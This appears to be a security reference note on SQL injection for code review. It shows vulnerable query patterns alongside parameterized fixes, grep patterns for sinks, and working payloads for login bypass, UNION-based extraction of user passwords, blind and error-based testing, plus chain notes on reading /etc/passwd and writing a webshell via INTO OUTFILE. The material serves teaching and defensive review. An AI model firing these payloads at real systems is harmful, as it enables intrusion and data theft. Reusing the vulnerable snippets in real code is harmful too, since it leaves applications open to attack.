# SQL Injection (SQLi)

**Tags:** #critical #sqli #injection #web #backend
**OWASP:** A03:2021 Injection
**CVSS Base:** 9.8 (Critical — unauthenticated, no interaction required)

---

## 📖 What it is

SQL Injection occurs when user input is concatenated directly into a SQL query without parameterization, allowing the attacker to modify the query's semantics.

---

## 🎯 Vulnerable Code Patterns

### PHP — `mysql_query` (Legacy)
```php
//  VULNERABLE
$user = mysql_query("SELECT * FROM users WHERE id = " . $_GET['id']);

//  VULNERABLE  even with mysqli
$query = "SELECT * FROM users WHERE email = '" . $_POST['email'] . "'";
$result = mysqli_query($conn, $query);
```

### Python — Concatenation in SQLAlchemy
```python
#  VULNERABLE
query = f"SELECT * FROM orders WHERE user_id = {user_id}"
db.execute(query)
```

### Java — Concatenated JDBC
```java
//  VULNERABLE
String query = "SELECT * FROM users WHERE name = '" + userName + "'";
Statement stmt = conn.createStatement();
stmt.executeQuery(query);
```

### C# / .NET
```csharp
//  VULNERABLE
string query = "SELECT * FROM Products WHERE Name = '" + input + "'";
SqlCommand cmd = new SqlCommand(query, conn);
```

---

## 🔍 `grep_search` Tactics

```
# Direct sinks  high priority
exec(
query(
mysqli_query(
mysql_query(
executeQuery(
cursor.execute(
db.raw(
$wpdb->query(

# Concatenation with external input
$_GET[
$_POST[
req.query.
req.body.
request.GET
request.POST
```

**Stack Heuristic:**
- Legacy PHP + `mysql_query` → SQLi via concatenation, very high probability
- ORM (Laravel, Django, ActiveRecord) → check `.raw()`, `.extra()`, custom query strings

---

## 💣 Confirmation Payloads

### Authentication Bypass
```sql
' OR '1'='1
' OR 1=1--
admin'--
' OR 'x'='x
```

### Data Extraction (UNION-Based)
```sql
' UNION SELECT NULL, username, password FROM users--
' UNION SELECT 1, table_name, 3 FROM information_schema.tables--
```

### Blind SQLi (Boolean-Based)
```sql
' AND 1=1--    normal response
' AND 1=2--    different response = vulnerable
```

### Blind SQLi (Time-Based)
```sql
-- MySQL
' AND SLEEP(5)--

-- MSSQL
'; WAITFOR DELAY '0:0:5'--

-- PostgreSQL
'; SELECT pg_sleep(5)--
```

### Error-Based SQLi
```sql
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version())))--
```

---

## 🔗 Second-Order SQLi

> The input enters "sanitized", is persisted in the database, and fires when re-read without re-sanitization.

```
Flow: Registration  database with apparently safe input
       subsequent login/search reuses the value without parameterization  SQLi
```

**Protocol:** always trace where a value saved in the database is reused in another query.

See: [[second-order-injection]]

---

## 🛡️ Fix

```python
#  CORRECT  Parameterized
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))

#  CORRECT  ORM (Django)
User.objects.filter(id=user_id)
```

```java
//  CORRECT  PreparedStatement
PreparedStatement ps = conn.prepareStatement(
    "SELECT * FROM users WHERE name = ?");
ps.setString(1, userName);
```

```php
//  CORRECT  PDO with bind
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = :id");
$stmt->execute(['id' => $id]);
```

---

## 🔗 Chain Exploits

```
SQLi + Stack Trace with exposed query  Precise payload without trial and error
SQLi (Read File)  LOAD_FILE('/etc/passwd')  LFI via SQL
SQLi (Write File)  INTO OUTFILE  Webshell  Critical RCE
```

---

## 📌 References
- [OWASP SQLi](https://owasp.org/www-community/attacks/SQL_Injection)
- [[eip-exploratory-investigation-protocol]]
- [[second-order-injection]]
- [[severity-matrix]]